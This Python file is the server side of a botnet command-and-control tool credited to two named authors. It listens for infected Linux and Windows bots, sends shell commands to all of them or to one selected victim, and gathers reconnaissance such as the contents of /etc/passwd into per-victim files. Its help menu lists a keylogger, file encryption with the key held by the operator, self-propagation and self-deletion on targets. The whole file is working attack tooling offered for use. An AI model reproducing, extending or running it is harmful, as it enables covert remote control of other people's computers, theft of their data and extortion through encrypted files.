#!/usr/bin/env python3

"""
AUTHORS: CHRIS KORTBAOUI, ALEXIS RODRIGUEZ
START DATE: 2020-04-06
END DATE: 2020-04
MODULE NAME: ss.py
"""

try:
	import socket # Import socket for creating TCP connection.
	from time import sleep # Import sleep from time to halt execution of program when necessary.
	import os # Import os for functions like _exit and system...
	from sys import exit # Import exit from sys to quit program when specified.
	from threading import Thread # Import Timer to create threads for our functions.
	from queue import Queue # Import Queue to use queue data structure functions.
	import readline # Import readline to allow arrow key history navigation.
	from subprocess import run # Import run for executing os.system commands.
except ImportError as err:
	print(f'Import error: {err}')
	sleep(5)
	exit(1)
	
""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

#  CONSTANTS   #
PORT = 1337 # Port number to receve connections from.
IP = "192.168.31.131" # IP address of your computer. Change this!
TO_ACCEPT = 10 # Number of connections to accept.
NUM_OF_THREADS = 2 # Number of threads that we will create.
THREAD_IDS = [1, 2] # Thread identifiers.
BUFFER = 20000 # Maximum number of bytes to accept from the output of command.
COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.
ENCODING = 'utf-8' # Encoding scheme.
DIRECTORY = './bots/' # Directory to store target response files in.

# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

#   GLOBALS   #
WINDOWS_CONNS = {} # Dict containing Windows machines IP addresses and corresponding socket object.
LINUX_CONNS = {} # Dict containing Linux machines IP addresses and corresponding socket object.
WINDOWS_COUNT = 0 # Count for the number of Windows machines connected to our botnet.
LINUX_COUNT = 0 # Count for the number of Linux machines connected to our botnet.
IP_ADDRESSES = [[],[]] # A list containing the IP addresses of both Lin/Win machines. Seperate lists.

# A list containing the commands to gather general recon info for linux machines.
LINUX_RECON_CMDS = ['cat /etc/passwd', 'cat /etc/group', 'ps aux', 'df', 'top -b -n 1']
# A list containing the commands to gather general recon info for windows machines.
WINDOWS_RECON_CMDS = ['os.systeminfo', 'tasklist']

# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

#  ANSICOLORS  #
RESET = '\033[0m'
BOLD = '\033[01m'
BLUE = '\033[94m'
DARKBLUE = '\033[34m'
GREEN = '\033[92m'
RED = '\033[91m'
PURPLE = '\033[95m'
DARKPURPLE = '\033[35m'
ORANGE = '\033[33m'

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class Server:
	"""Socket server"""
	def __init__(self):
		pass

	def create_socket(self):
		"""This function will create a single server socket will create a socket
		and bind it to an IP and network interface.
			Arguments:
				None
			Returns:
				None
		"""
		try:
			self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.server_socket.bind((IP, PORT))
			self.server_socket.listen(TO_ACCEPT)
		except:
			print(RED + '[-] There is a running Red C&C. Make sure you have the right IP address and try again.\n' + RESET)
			os._exit(1)

	def accept_connections(self):
		"""This function will accept all incoming connectins to this server. This function
		is also storing connections from Windows and Linux machines into there appropiate
		dictionaries. All IPs connected will also be dealt with here.
			Arguments:
				None
			Returns:
				None
		"""
		# To modify and altar global variables:
		global LINUX_CONNS
		global LINUX_COUNT
		global WINDOWS_CONNS
		global WINDOWS_COUNT

		LINUX_CONNS.clear()
		WINDOWS_CONNS.clear()

		while True:
			conn, addr = self.server_socket.accept()
			conn.setblocking(1)
			initial_response = conn.recv(COMMMAND_SIZE).decode('utf-8')

			if initial_response == 'Linux':
				if addr[0] in LINUX_CONNS.keys():
					LINUX_CONNS[addr[0]] = conn
				else:
					LINUX_CONNS[addr[0]] = conn
					LINUX_COUNT += 1
					IP_ADDRESSES[0].append(addr[0])
			else:
				if addr[0] in WINDOWS_CONNS.keys():
					WINDOWS_CONNS[addr[0]] = conn
				else:
					WINDOWS_CONNS[addr[0]] = conn
					WINDOWS_COUNT += 1
					IP_ADDRESSES[1].append(addr[0])

	def close(self):
		"""This function will close all active connections.
				Arguments:
					None
				Returns:
					None
		"""
		for conn in LINUX_CONNS.values():
			conn.close()
		
		for conn in WINDOWS_CONNS.values():
			conn.close()

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

class BotnetCmdCtrl:
	"""Botnet class definition"""
	def __init__(self):
		self.server = Server() # Will instantiate and store a Server object.
		self.server_queue = Queue() # Will be used to perform next job in the queue.
		self.output_to_file = False # Will switch mode from only stdout to stdout and file stream.
		self.threads = [] # Will store the two threads created.
		# To modify and altar global variables:
		global LINUX_COUNT
		global LINUX_CONNS
		global WINDOWS_COUNT
		global WINDOWS_COUNT
		global IP_ADDRESSES

	def handle_threads(self):
		"""This function will create two seperate threads.
		One will be used to accept incoming connections, and
		the other will be used to performing I/O between all
		of our connections.
			Arguments:
				None
			Returns:
				None
		"""
		for _ in range(NUM_OF_THREADS):
			t = Thread(target=self.command_and_control, daemon=True) # Create thread
			self.threads.append(t)
			t.start() # Start the thread

		
	def create_jobs(self):
		"""This function will create jobs and store them in a queue.
		The jobs will be executed by seperate threads.
			Arguments:
				None
			Returns:
				None
		"""
		for x in THREAD_IDS:
			self.server_queue.put(x) # Add element to the queue.
		self.server_queue.join() # Block main thread until worker threads have processes everything in queue.

	def get_command(self):
		"""This function gets a command from the user.
			Arguments:
				None
			Returns:
				The command that was provided by the user.
		"""
		current_dir = os.getcwd()
		cmd = input(GREEN + BOLD + f'{current_dir[1:]}$ ' + RESET)
		while True:
			if cmd == 'exit':
				print(RED, '\n[+] You have closed all connections. Exiting program.', RESET)
				self.server.close()
				os._exit(0)

			elif cmd.strip() == 'ls lin':
				if len(IP_ADDRESSES[0]) == 0:
					print(RED + BOLD + '[!] Warning: ' + RESET + 'There are no Linux connections to list.')
				else:
					for ip in IP_ADDRESSES[0]:
						print(BLUE + str(IP_ADDRESSES[0].index(ip)) + RESET + ' - ' + ip)

			elif cmd.strip() == 'ls win':
				if len(IP_ADDRESSES[1]) == 0:
					print(RED + BOLD + '[!] Warning: ' + RESET + 'There are no Windows connections to list.')
				else:
					for ip in IP_ADDRESSES[1]:
						print(BLUE + str(IP_ADDRESSES[1].index(ip)) + RESET + ' - ' + ip)
			
			elif cmd.strip() == 'ls all':
				if len(IP_ADDRESSES[0]) + len(IP_ADDRESSES[1]) == 0: # Check if there no connections.
					print(RED + BOLD + '[-] There are no connections to list.' + RESET) # Print this if there arent connections.
				else:
					print(DARKPURPLE + BOLD + 'Linux connections:\n' + RESET)
					if len(IP_ADDRESSES[0]) == 0: # If there are no Linux connections print the following message.
						print(RED + BOLD + 'There are no Linux connections to list.' + RESET)
					else: # Else loop over Linux IP list and print out the IP followed by there index.
						for ip in IP_ADDRESSES[0]:
							print(BLUE + str(IP_ADDRESSES[0].index(ip)) + RESET + ' - ' + ip)

					print(DARKPURPLE + BOLD + 'Windows connections:\n' + RESET)
					if len(IP_ADDRESSES[1]) == 0: # If there are no Windows connections print the following message.
						print(RED + BOLD + 'There are no Windows connections to list.' + RESET)
					else: # Else loop over Windows IP list and print out the IP followed by there index.
						for ip in IP_ADDRESSES[1]:
							print(BLUE + str(IP_ADDRESSES[1].index(ip)) + RESET + ' - ' + ip)

			elif cmd.strip() == 'cnt lin':
				print(f'[{PURPLE + BOLD + str(LINUX_COUNT) + RESET}] Linux.')

			elif cmd.strip() == 'cnt win':
				print(f'[{PURPLE + BOLD + str(WINDOWS_COUNT) + RESET}] Windows.')

			elif cmd[:3] == 'lin':
				resp_list = self.send_cmd_all_linux(cmd[4:])
				i = 0
				for output in resp_list:
					if i % 2 == 1 and self.output_to_file == False:
						print(output)
					elif i % 2 == 1 and self.output_to_file:
						print(output)
						self.write_response_output(output, resp_list[resp_list.index(output) - 1])
					else:
						print((RED + output + RESET + '\n').replace(' ', ''))
					i += 1

			elif cmd[:3] == 'win':
				resp_list = self.send_cmd_all_windows(cmd[4:])
				i = 0
				for output in resp_list:
					if i % 2 == 1 and self.output_to_file == False:
						print(output)
					elif i % 2 == 1 and self.output_to_file:
						print(output)
						self.write_response_output(output, resp_list[resp_list.index(output) - 1])
					else:
						print((RED + output + RESET + '\n').replace(' ', ''))
					i += 1

			elif cmd[:2] == 'sh': # Execute shell command on host machine.
				try:
					run(cmd[3:].strip().split())
				except:
					try:
						os.chdir(cmd[6:])
						print(RED + 'Ok' + RESET)
					except:
						print(RED + '[-] Couldn\'t run command: ' + RESET + cmd[3:])

			elif cmd[:7] == 'sel lin': # Select the Linux target to connect to.
				try:
					index = int(cmd[8:].strip())
					self.send_cmd_linux_target(index)
				except ValueError:
					print(RED + '[-] Invalid index.' + RESET)
					continue

			elif cmd[:7] == 'sel win': # Select the Windows target to connect to.
				try:
					index = int(cmd[8:].strip())
					self.send_cmd_windows_target(index)
				except ValueError:
					print(RED + '[-] Invalid index.' + RESET)
					continue

			elif cmd.strip() == 'autorecon linux':
				b = 0
				while b < len(LINUX_RECON_CMDS):
					command_to_send = LINUX_RECON_CMDS[b]
					resp_list = self.send_cmd_all_linux(command_to_send)
					b += 1
					i = 0
					for output in resp_list:
						if i % 2 == 1 and self.output_to_file == False:
							print(output)
						elif i % 2 == 1 and self.output_to_file:
							print(output)
							self.write_response_output(output, resp_list[resp_list.index(output) - 1])
						else:
							print((RED + output + RESET + '\n').replace(' ', ''))
						i += 1

			elif cmd.strip() == 'autorecon windows':
				b = 0
				while b < len(WINDOWS_RECON_CMDS):
					command_to_send = WINDOWS_RECON_CMDS[b]
					resp_list = self.send_cmd_all_windows(command_to_send)
					b += 1
					i = 0
					for output in resp_list:
						if i % 2 == 1 and self.output_to_file == False:
							print(output)
						elif i % 2 == 1 and self.output_to_file:
							print(output)
							self.write_response_output(output, resp_list[resp_list.index(output) - 1])
						else:
							print((RED + output + RESET + '\n').replace(' ', ''))
						i += 1

			elif cmd.strip() == 'switch': # Swithing writing modes: to stdout only, to stdout and file.
				self.output_to_file = not self.output_to_file

			elif cmd.strip() == 'check mode': # Check what write mode the program is in.
				if self.output_to_file:
					print(ORANGE + BOLD + '[*] Mode' + RESET + ' = write to stdout and files.')
				else:
					print(ORANGE + BOLD + '[*] Mode' + RESET + ' = write to stdout.')

			elif cmd.strip() == 'close': # If command eq 'close',
				self.server.close()	# close all connections.
				print(ORANGE + BOLD + '[+]' + RESET + ' All connections were closed.')

			elif cmd.strip() == 'clear':
				os.system('clear')

			elif cmd.strip() == 'help':
				self.help()

			else:
				print(RED + BOLD + '[-] Invalid command!' + RESET + ' type' + GREEN + " 'help' " + RESET + 'for help menu.')
			
			current_dir = os.getcwd() # Update the current dir variable if user changes directory

			cmd = input(GREEN + BOLD + f'{current_dir[1:]}$ ' + RESET)
	
	def send_cmd_all_linux(self, cmd: str):
		"""This function will send the command to all linux bots in the botnet.
			Arguments:
				cmd (str): Command to send to target/s.
			Returns:
				Will return the response generated by the executed command on the client machines operating on linux.
		"""
		response_list = []
		for ip, conn in LINUX_CONNS.items():
			conn.send(cmd.encode(ENCODING))
			response = conn.recv(BUFFER).decode(ENCODING) # Store response received from executed command.
			response = response[2:-1]
			response = response.replace('\\n', '\n')
			response_list.extend([ip, response])
		return response_list
			
	def send_cmd_all_windows(self, cmd: str):
		"""This function sends a command to all windows bots in the botnet.
			Arguments:
				cmd (str): Command to send to target/s.
		 	Returns:
				None
		"""
		response_list = []
		for ip, conn in WINDOWS_CONNS.items():
			conn.send(cmd.encode(ENCODING))
			response = conn.recv(BUFFER).decode(ENCODING) # Store response received from executed command.
			response = response[2:-1]
			response = response.replace('\\n', '\n')
			response = response.replace('\r', '')
			response_list.extend([ip, response])
		return response_list
	
	def send_cmd_linux_target(self, ip_index: int):
		"""This function will send a command to a specific Linux machine.
			Arguments:
				ip_index (int): The index of the IP address the user wants to connect to.
			Returns:
				None
		"""
		try:
			target_ip = IP_ADDRESSES[0][ip_index]
		except IndexError:
			print(RED + BOLD + '[!] Warning:' + RESET + ' There are no Linux connections.')
			return
		except:
			print(RED + '[-] An error was thrown...' + RESET)
			return
		try:
			conn = LINUX_CONNS[target_ip]
		except KeyError:
			print(RED + '[-] Invalid index!' + RED)

		while True:
			cmd = input(PURPLE + f'[shell][{target_ip}]$ ' + RESET)
			if cmd == 'back':
				break
			elif cmd == 'exit':
				print(RED + '\n[+] You have closed all connections. Exiting program.' + RESET)
				self.server.close()
				os._exit(1)
			elif cmd == 'help':
				self.help()
				continue
			elif cmd == 'clear':
				os.system('clear')
				continue

			try:
				conn.send(cmd.encode(ENCODING))
				resp = conn.recv(BUFFER).decode(ENCODING)
			except BrokenPipeError:
				print(RED + f'[-] The connection to {target_ip} is no longer available.' + RESET)
				del LINUX_CONNS[target_ip]
				break
			
			if resp == '[-] Invalid command.' or resp == 'Ok':
				print(RED + resp + RESET)
			elif resp == 'listening':
				print(DARKBLUE + '[*] Keylogger initiated.' + RESET)
			else:
				resp = resp[2:-1]
				resp = resp.replace('\\n', '\n')
				print(resp)


	def send_cmd_windows_target(self, ip_index: int):
		"""This function will send a command to a specific Windows machine.
			Arguments:
				ip_index (int): The index of the IP address the user wants to connect to.
			Returns:
				None
		"""
		try:
			target_ip = IP_ADDRESSES[1][ip_index]
		except IndexError:
			print(RED + BOLD + '[!] Warning:' + RESET + ' There are no Windows connections.')
			return
		except:
			print(RED + '[-] An error was thrown.' + RESET)
			return

		try:
			conn = WINDOWS_CONNS[target_ip]
		except KeyError:
			print(RED + '[-] Invalid index!' + RED)

		while True:
			cmd = input(PURPLE + f'[shell][{target_ip}]$ ' + RESET)
			if cmd == 'back':
				break
			elif cmd == 'exit':
				print(RED + '\n[+] You have closed all connections. Exiting program.' + RESET)
				self.server.close()
				os._exit(1)
			elif cmd == 'help':
				self.help()
				continue
			elif cmd == 'clear':
				os.system('clear')
				continue

			try:
				conn.send(cmd.encode(ENCODING))
				resp = conn.recv(BUFFER).decode(ENCODING)
			except BrokenPipeError:
				print(RED + f'[-] The connection to {target_ip} is no longer available.' + RESET)
				del WINDOWS_CONNS[target_ip]
				break

			if resp == '[-] Invalid command...' or resp == 'Ok':
				print(RED + resp + RESET)
			elif resp == 'None':
				print(DARKBLUE + '[*] Keylogger initiated.' + RESET)
			else:
				resp = resp[2:-1]
				resp = resp.replace('\\n', '\n')
				resp = resp.replace('\\r', '')
				print(resp)

	def write_response_output(self, response: str, ip_addr: str):
		"""This function will write the response generated by each machine in the botnet 
		to a folder called "bots". The bots folder will contain files called by
		the IP addresses of each compromised machines.
		 	Arguments:
				response (str): The executed command response.
				ip_addr (str): The IP addresses of the current machine we are communicating with.
			Returns:
				None
		"""
		with open(DIRECTORY + ip_addr, 'a+') as botfile:
			botfile.write(response)
			
	def command_and_control(self):
		"""This function is running the operations for each (2) thread we create
		in the handle_threads function.
			Arguments:
				None
			Returns:
				None
		"""
		while True:
			x = self.server_queue.get()
			if x == 1:
				self.server.create_socket()
				self.server.accept_connections()
			if x == 2:
				self.get_command()
			self.server_queue.task_done()
				
	def help(self):
		"""This function will print the help menu.
			Arguments:
				None
			Returns:
				None
		"""
		print(PURPLE + BOLD + 'Commands in main session: ' + RESET)
		print(ORANGE + BOLD + '  ls lin >', RESET, 'Lists all the Linux connections (IPs).')
		print(ORANGE + BOLD + '  ls win >', RESET, 'Lists all the Windows connections (IPs).')
		print(ORANGE + BOLD + '  ls all >', RESET, 'List both Windows and Linux connections (IPs).')
		print(ORANGE + BOLD + '  cnt lin >', RESET, 'Lists the amount of Linux connections (int).')
		print(ORANGE + BOLD + '  cnt win >', RESET, 'Lists the amount of Windows connections (int).')
		print(ORANGE + BOLD + '  lin [command] >', RESET, 'Send command to all Linux machines.')
		print(ORANGE + BOLD + '  win [command] >', RESET, 'Send command to all Windows machines.')
		print(ORANGE + BOLD + '  sel lin|win [IP index] >', RESET, 'Select number from ls lin|win outputs and connect to one target.')
		print(ORANGE + BOLD + '  switch >', RESET, 'Switch writing modes: to std out, or to stdout and file.')
		print(ORANGE + BOLD + '  check mode >', RESET, 'Check write mode.')
		print(ORANGE + BOLD + '  autorecon linux >', RESET, 'Performs basic reconnaissance on Linux machines.' )
		print(ORANGE + BOLD + '  autorecon windows >', RESET, 'Performs basic reconnaissance on Windows machines.')
		print(ORANGE + BOLD + '  sh [command] >', RESET, 'Execute command on the host machine.')
		print(ORANGE + BOLD + '  clear >', RESET, 'Clears the screen.')
		print(ORANGE + BOLD + '  close >', RESET , 'Will close all active connections.')
		print(ORANGE + BOLD + '  exit >', RESET, "Quit the program.", end='\n\n')
		print(PURPLE + BOLD + 'Commands when connected to a target:', RESET)
		print(ORANGE + BOLD + '  keylog >', RESET, 'Begins a keylogger, store data in tmp folder, file name log.txt.')
		print(ORANGE + BOLD + '  encrypt [path or file] >', RESET, 'Encrypt a file. Save the encryption key!')
		print(ORANGE + BOLD + '  propagate >', RESET, "Copy client file to three different directory.")
		print(ORANGE + BOLD + '  destroy >', RESET, "Attempt to delete the copies of the program on target machines.")
		print(ORANGE + BOLD + '  decrypt [path or file] [key] >', RESET, 'Decrypt a file.')
		print(ORANGE + BOLD + '  back >', RESET, 'Return to the main session.')
		print(ORANGE + BOLD + '  clear >', RESET, 'Clears the screen.')
		print(ORANGE + BOLD + '  exit >', RESET, "Quits the program.")

	def start(self):
		"""This function will initiate the program.
			Arguments:
				None
			Returns:
				None
		"""
		self.handle_threads() # Call functions to create threads
		self.create_jobs() # Call function to create jobs.

	def program_info(self):
		print("""
██████╗ ███████╗██████╗  ██████╗   ██╗    ██████╗
██╔══██╗██╔════╝██╔══██╗██╔════╝   ██║   ██╔════╝
██████╔╝█████╗  ██║  ██║██║     ████████╗██║     
██╔══██╗██╔══╝  ██║  ██║██║     ██╔═██╔═╝██║     
██║  ██║███████╗██████╔╝╚██████╗██████║  ╚██████╗
╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝╚═════╝   ╚═════╝
""")
		print('By: ' + PURPLE + BOLD + '@' + RESET + 'Chris Kortbaoui', end=' ')
		print('<|[*]|> ' + PURPLE + BOLD + '@' + RESET + 'Alexis Rodriguez', end='\n\n')

""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """

def main():
	botnetObj = BotnetCmdCtrl() # Instantiating socket object.
	botnetObj.program_info() # Prints the program name.
	botnetObj.start() # Initiate the program.

if __name__ == '__main__':
	server = Server() # Will be used here to close all socket connections before exiting program.
	try:
		main()
	except KeyboardInterrupt: # Handling KeyboardInterrupt error.
		print(RED, '\nExiting program...', RESET)
		server.close()
		sleep(0.25)
		run(['reset'])
